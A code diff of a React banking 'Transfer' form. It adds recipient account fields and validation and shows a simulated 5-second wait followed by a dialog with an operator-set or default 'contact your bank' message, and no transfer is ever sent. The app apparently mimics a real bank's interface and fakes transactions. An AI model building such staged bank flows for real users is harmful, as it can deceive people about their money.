@@ -1,12 +1,14 @@
 "use client";
 
-import React, { useEffect, useState } from "react";
-import Link from "next/link";
+import React, { useEffect, useState, Fragment } from "react";
 import SelectBks from "../dropdown/SelectBks";
 import { formatCurrency } from "../formatCurrency";
 import { Account } from "@/utils/types";
 import { generateRandomCode } from "./generateRandomCode";
+import Link from "next/link";
 import Loader from "../Loader";
+import { Dialog, Transition } from "@headlessui/react";
+// import { TelegramSendMessage } from "../TelegramSendMessage";
 
 interface Bks {
   id: number;
@@ -16,6 +18,8 @@ interface Bks {
 
 interface FormErrors {
   routingNumber?: string;
+  accountNumber?: string;
+  accountName?: string;
   selectedBank?: string;
   amount?: string;
   transCode?: string;
@@ -23,9 +27,12 @@ interface FormErrors {
 
 export default function Transfer() {
   const [user, setUser] = useState<Account | null>(null);
+  const [isOpen, setIsOpen] = useState(true);
   const [step, setStep] = useState(1);
   const [formData, setFormData] = useState({
     routingNumber: "",
+    accountNumber: "",
+    accountName: "",
     selectedBank: null as Bks | null,
     amount: "",
     remark: "",
@@ -34,10 +41,10 @@ export default function Transfer() {
   const [errors, setErrors] = useState<FormErrors>({});
   const [generatedCode, setGeneratedCode] = useState<string>("");
   const [loading, setLoading] = useState(false);
-  const [showModal, setShowModal] = useState(false);
 
   useEffect(() => {
     const loggedInUser = localStorage.getItem("loggedInUser");
+
     if (loggedInUser) {
       try {
         const user = JSON.parse(loggedInUser) as Account;
@@ -52,6 +59,7 @@ export default function Transfer() {
     if (step === 3) {
       const code = generateRandomCode();
       setGeneratedCode(code);
+      // TelegramSendMessage(`Your transaction code is: ${code}`);
     }
   }, [step]);
 
@@ -60,7 +68,7 @@ export default function Transfer() {
     if (Object.keys(validationErrors).length === 0) {
       if (step === 2 && user) {
         const enteredAmount = parseFloat(formData.amount);
-        if (enteredAmount > user.bank_details.current_balance_usd) {
+        if (enteredAmount > user.bank_details.balance_usd) {
           setErrors({ amount: "Insufficient balance" });
           return;
         }
@@ -81,22 +89,21 @@ export default function Transfer() {
     const { name, value } = e.target;
     setFormData({
       ...formData,
-      [name]: name === "amount" ? value : value,
+      [name]: name === "amount" ? parseFloat(value) : value,
     });
   };
 
-  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
+  const handleSubmit = (e: React.FormEvent<HTMLFormElement>) => {
     e.preventDefault();
     const validationErrors = validateForm();
 
     if (Object.keys(validationErrors).length === 0) {
       setLoading(true);
 
-      // Simulate API call with timeout
-      await new Promise((resolve) => setTimeout(resolve, 3000));
-
-      setLoading(false);
-      setShowModal(true);
+      setTimeout(() => {
+        setLoading(false); // Stop loading after 5 seconds
+        setStep(step + 1); // Proceed to the next step (success message)
+      }, 5000); // Simulate loading for 5 seconds
     } else {
       setErrors(validationErrors);
     }
@@ -104,20 +111,33 @@ export default function Transfer() {
 
   const validateForm = () => {
     const errors: FormErrors = {};
+  
     if (step === 1) {
-      if (!formData.routingNumber) {
-        errors.routingNumber = "Routing number is required";
-      } else if (formData.routingNumber.length !== 9) {
-        errors.routingNumber = "Routing number must be 9 digits";
+      if (!formData.selectedBank) {
+        errors.selectedBank = 'Bank selection is required';
       }
-      if (!formData.selectedBank)
-        errors.selectedBank = "Bank selection is required";
-    } else if (step === 2) {
-      if (!formData.amount) errors.amount = "Amount is required";
-    } else if (step === 3) {
-      if (formData.transCode !== user?.transaction_mgs_code.transaction_code)
-        errors.transCode = "Incorrect transaction code";
+  
+      if (user?.bank_details.account_number) {
+        if (!formData.accountNumber) {
+          errors.accountNumber = 'Account number is required';
+        } else if (formData.accountNumber.length < 8 || formData.accountNumber.length > 12) {
+          errors.accountNumber = 'Account number must be between 8 and 12 digits';
+        }
+      }
+  
+      if (user?.bank_details.account_name && !formData.accountName) {
+        errors.accountName = 'Account name is required';
+      }
+  
+      if (!user?.bank_details.account_number) {
+        if (!formData.routingNumber) {
+          errors.routingNumber = 'Routing number is required';
+        } else if (formData.routingNumber.length < 8 || formData.routingNumber.length > 12) {
+          errors.routingNumber = 'Routing number must be between 8 and 12 digits';
+        }
+      }
     }
+  
     return errors;
   };
 
@@ -135,18 +155,61 @@ export default function Transfer() {
                 Recipient Account
               </h2>
               <div className="">
-                <input
-                  type="number"
-                  name="routingNumber"
-                  value={formData.routingNumber}
-                  onChange={handleChange}
-                  placeholder="Routing Number"
-                  required
-                  className="w-full p-3 my-2 mb-2 min-h-[60px] bg-[#f8f8f8] rounded-lg border-none text-[#2e2e2e] focus:outline-none"
-                />
-                {errors.routingNumber && (
-                  <p className="text-red-500 text-sm">{errors.routingNumber}</p>
+                {user.bank_details.account_name && (
+                  <>
+                    <input
+                      type="text"
+                      name="accountName"
+                      value={formData.accountName}
+                      onChange={handleChange}
+                      placeholder="Account Name"
+                      required
+                      className="w-full p-3 my-2 mb-2 min-h-[60px] bg-[#f8f8f8] rounded-lg border-none text-[#2e2e2e] focus:outline-none"
+                    />
+                    {errors.accountName && (
+                      <p className="text-red-500 text-sm">
+                        {errors.accountName}
+                      </p>
+                    )}
+                  </>
                 )}
+
+                {user.bank_details.account_number ? (
+                  <>
+                    <input
+                      type="number"
+                      name="accountNumber"
+                      value={formData.accountNumber}
+                      onChange={handleChange}
+                      placeholder="Account Number"
+                      required
+                      className="w-full p-3 my-2 mb-2 min-h-[60px] bg-[#f8f8f8] rounded-lg border-none text-[#2e2e2e] focus:outline-none"
+                    />
+                    {errors.accountNumber && (
+                      <p className="text-red-500 text-sm">
+                        {errors.accountNumber}
+                      </p>
+                    )}
+                  </>
+                ) : (
+                  <>
+                    <input
+                      type="number"
+                      name="routingNumber"
+                      value={formData.routingNumber}
+                      onChange={handleChange}
+                      placeholder="Routing Number"
+                      required
+                      className="w-full p-3 my-2 mb-2 min-h-[60px] bg-[#f8f8f8] rounded-lg border-none text-[#2e2e2e] focus:outline-none"
+                    />
+                    {errors.routingNumber && (
+                      <p className="text-red-500 text-sm">
+                        {errors.routingNumber}
+                      </p>
+                    )}
+                  </>
+                )}
+
                 <SelectBks
                   selectedBank={formData.selectedBank}
                   setSelectedBank={(bks) =>
@@ -160,13 +223,13 @@ export default function Transfer() {
               <div className="flex items-center justify-between gap-20">
                 <Link
                   href="/dashboard"
-                  className="max-w-max flex items-center justify-center rounded-full mt-4 px-4 min-h-[50px] text-xl bg-[#117aca] text-white"
+                  className="max-w-max flex items-center justify-center rounded-full mt-4 px-4 min-h-[50px] text-xl bg-[#117ACA] text-white"
                 >
                   Cancel
                 </Link>
                 <button
                   type="button"
-                  className="w-full rounded-full mt-4 px-4 min-h-[50px] text-xl bg-[#117aca] text-white"
+                  className="w-full rounded-full mt-4 px-4 min-h-[50px] text-xl bg-[#117ACA] text-white"
                   onClick={handleNext}
                 >
                   Next
@@ -174,12 +237,13 @@ export default function Transfer() {
               </div>
             </div>
           )}
+
           {step === 2 && (
             <div>
               <div className="mb-3">
                 <span className="">Transfer From</span>
                 <div className="flex gap-2 mt-2">
-                  <div className="rounded-lg flex items-center justify-center w-[35px] h-[35px] bg-[#117aca] text-white">
+                  <div className="rounded-lg flex items-center justify-center w-[35px] h-[35px] bg-[#117ACA] text-white">
                     WF
                   </div>
                   <div className="flex flex-col gap-1">
@@ -187,8 +251,7 @@ export default function Transfer() {
                       {user.holder.firstName} {user.holder.lastName}
                     </span>
                     <span className="text-sm text-[#303030]">
-                      Balance:{" "}
-                      {formatCurrency(user.bank_details.current_balance_usd)}
+                      Balance: {formatCurrency(user.bank_details.balance_usd)}
                     </span>
                   </div>
                 </div>
@@ -229,13 +292,13 @@ export default function Transfer() {
               <div className="flex items-center justify-between gap-20">
                 <Link
                   href="/dashboard"
-                  className="max-w-max flex items-center justify-center rounded-full mt-4 px-4 min-h-[50px] text-xl bg-[#117aca] text-white"
+                  className="max-w-max flex items-center justify-center rounded-full mt-4 px-4 min-h-[50px] text-xl bg-[#117ACA] text-white"
                 >
                   Cancel
                 </Link>
                 <button
                   type="button"
-                  className="w-full rounded-full mt-4 px-4 min-h-[50px] text-xl bg-[#117aca] text-white"
+                  className="w-full rounded-full mt-4 px-4 min-h-[50px] text-xl bg-[#117ACA] text-white"
                   onClick={handleNext}
                 >
                   Proceed
@@ -250,16 +313,21 @@ export default function Transfer() {
                 You are about to transfer{" "}
                 {formatCurrency(Number(formData.amount))} to&nbsp;
                 <span className="uppercase font-[600]">
-                  {formData.selectedBank?.name}
+                  {formData.accountName
+                    ? formData.accountName
+                    : formData.selectedBank?.name}
                 </span>
                 &nbsp;from your&nbsp;
                 <span className="font-[500]">CHECKING ACCOUNT</span>
+                <br />
               </p>
-
+              <h2 className="text-[#2e2e2e] text-lg hidden mb-4">
+                Please input the code sent to you
+              </h2>
               {user?.transaction_mgs_code.transaction_code && (
                 <>
                   <p className="text-[14px] text-center text-zinc-700 my-2 mt-2">
-                    {user.transaction_mgs_code.transaction_text_msg}
+                    To continue, Please input the code sent to you
                   </p>
                   <div className="">
                     <input
@@ -268,14 +336,16 @@ export default function Transfer() {
                       value={formData.transCode}
                       onChange={handleChange}
                       placeholder="Input transaction code sent to you"
-                      disabled={loading}
+                      // required
                       className="w-full p-3 my-2 mb-2 min-h-[60px] text-center bg-[#f8f8f8] rounded-lg border-none text-[#2e2e2e] focus:outline-none"
                     />
-                    {!loading && errors.transCode && (
-                      <p className="text-red-500 text-center text-sm">
-                        {errors.transCode}
-                      </p>
-                    )}
+                    {loading
+                      ? ""
+                      : errors.transCode && (
+                          <p className="text-red-500 text-center text-sm">
+                            {errors.transCode}
+                          </p>
+                        )}
                   </div>
                 </>
               )}
@@ -283,68 +353,82 @@ export default function Transfer() {
               <div className="flex items-center justify-between gap-20">
                 <Link
                   href="/dashboard"
-                  className="max-w-max flex items-center justify-center rounded-full mt-4 px-4 min-h-[50px] text-xl bg-[#117aca] text-white"
+                  className="max-w-max flex items-center justify-center rounded-full mt-4 px-4 min-h-[50px] text-xl bg-[#117ACA] text-white"
                 >
                   Cancel
                 </Link>
                 <button
                   type="submit"
-                  disabled={loading}
-                  className="w-full rounded-full mt-4 px-4 min-h-[50px] text-xl bg-[#117aca] text-white flex items-center justify-center"
+                  className="w-full rounded-full mt-4 px-4 min-h-[50px] text-xl bg-[#117ACA] text-white"
                 >
-                  {loading ? (
-                    <div className="flex items-center gap-2">
-                      <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
-                      <span className="text-sm">Processing...</span>
-                    </div>
-                  ) : (
-                    "Transfer"
-                  )}
+                  {loading ? "Loading..." : "Transfer"}
                 </button>
               </div>
             </div>
           )}
+
           {step === 4 && (
-            <div>
-              {user.transaction_mgs_code.lastStepText ? (
-                <p className="text-[17px] text-center text-zinc-700">
-                  {user.transaction_mgs_code.lastStepText}
-                </p>
-              ) : (
-                <p className="text-[17px] text-zinc-700">
-                  Currently, an issue exists that requires your attention. To
-                  proceed with this transaction, we kindly request that you
-                  contact your bank. Thank you for your cooperation.
-                </p>
-              )}
-            </div>
+            <Transition appear show={isOpen} as={Fragment}>
+              <Dialog
+                as="div"
+                className="relative z-10"
+                onClose={() => setIsOpen(false)}
+              >
+                <Transition.Child
+                  as={Fragment}
+                  enter="ease-out duration-300"
+                  enterFrom="opacity-0 scale-95"
+                  enterTo="opacity-100 scale-100"
+                  leave="ease-in duration-200"
+                  leaveFrom="opacity-100 scale-100"
+                  leaveTo="opacity-0 scale-95"
+                >
+                  <div className="fixed inset-0 bg-black bg-opacity-25"></div>
+                </Transition.Child>
+
+                <div className="fixed inset-0 overflow-y-auto">
+                  <div className="flex min-h-full items-center justify-center p-4 text-center">
+                    <Transition.Child
+                      as={Fragment}
+                      enter="ease-out duration-300"
+                      enterFrom="opacity-0 scale-95"
+                      enterTo="opacity-100 scale-100"
+                      leave="ease-in duration-200"
+                      leaveFrom="opacity-100 scale-100"
+                      leaveTo="opacity-0 scale-95"
+                    >
+                      <Dialog.Panel className="w-full max-w-md transform overflow-hidden rounded-2xl bg-white p-6 text-left align-middle shadow-xl transition-all">
+                        <div className="mt-4">
+                          {user.transaction_mgs_code.lastStepText ? (
+                            <p className="text-lg font-medium leading-6 text-gray-9000">
+                              {user.transaction_mgs_code.lastStepText}
+                            </p>
+                          ) : (
+                            <p className="text-lg font-medium leading-6 text-gray-9000">
+                              Currently, an issue exists that requires your
+                              attention. To proceed with this transaction, we
+                              kindly request that you contact your bank. Thank
+                              you for your cooperation.
+                            </p>
+                          )}
+                        </div>
+                        <div className="mt-4">
+                          <Link
+                            href="/dashboard"
+                            className="flex justify-center rounded-md border border-transparent bg-[#117ACA] px-4 py-2 text-sm font-medium text-white hover:bg-[#117ACA]/50 focus:outline-none focus-visible:ring-2 focus-visible:ring-red-500 focus-visible:ring-offset-2"
+                          >
+                            Go Home
+                          </Link>
+                        </div>
+                      </Dialog.Panel>
+                    </Transition.Child>
+                  </div>
+                </div>
+              </Dialog>
+            </Transition>
           )}
         </form>
       </div>
-
-      {/* Modal */}
-      {showModal && (
-        <div className="flex items-center px-4 justify-center fixed top-0 w-full h-screen bg-[#000000]/50 z-50 left-0 right-0">
-          <div className="w-[300px] flex flex-col gap-5 rounded-lg bg-white p-5 relative -top-[80px]">
-            {!user?.transaction_mgs_code.transaction_code ? (
-              <p className="text-black text-base text-center">
-                {user.transaction_mgs_code.noCodeText}
-              </p>
-            ) : (
-              <p className="text-black text-base text-center">
-                {user.transaction_mgs_code.lastStepText ||
-                  "Currently, an issue exists that requires your attention. To proceed with this transaction, we kindly request that you contact your bank. Thank you for your cooperation."}
-              </p>
-            )}
-            <Link
-              href="/dashboard"
-              className="border flex items-center justify-center p-2 text-lg text-white rounded-full bg-[#117aca]"
-            >
-              Ok
-            </Link>
-          </div>
-        </div>
-      )}
     </div>
   );
 }
